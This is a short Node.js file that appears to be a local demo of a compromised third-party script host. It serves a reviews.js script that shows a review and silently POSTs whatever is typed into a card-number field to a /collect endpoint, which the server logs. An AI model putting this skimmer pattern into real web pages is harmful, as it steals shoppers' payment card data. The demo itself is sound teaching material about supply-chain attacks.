// A stand-in for a third-party script host that was broken into: it serves reviews.js,
// which shows reviews and also copies the card number to /collect. Only on this machine.
import http from 'node:http';

const reviews = `
document.getElementById('reviews').innerHTML = '<p>★★★★★ "Great seats!" — Ben</p>';
document.getElementById('card').addEventListener('change', (e) => {
  fetch('http://127.0.0.1:9900/collect', { method: 'POST', body: e.target.value, mode: 'no-cors' });
});`;

http.createServer((req, res) => {
  if (req.url === '/reviews.js') {
    res.writeHead(200, { 'content-type': 'text/javascript' });
    return res.end(reviews);
  }
  if (req.url === '/collect') {
    let body = '';
    req.on('data', (c) => (body += c));
    return req.on('end', () => { console.log(`collected a card number: ${body}`); res.end(); });
  }
  res.writeHead(404).end();
}).listen(9900, '127.0.0.1', () => console.log('vendor on http://127.0.0.1:9900'));
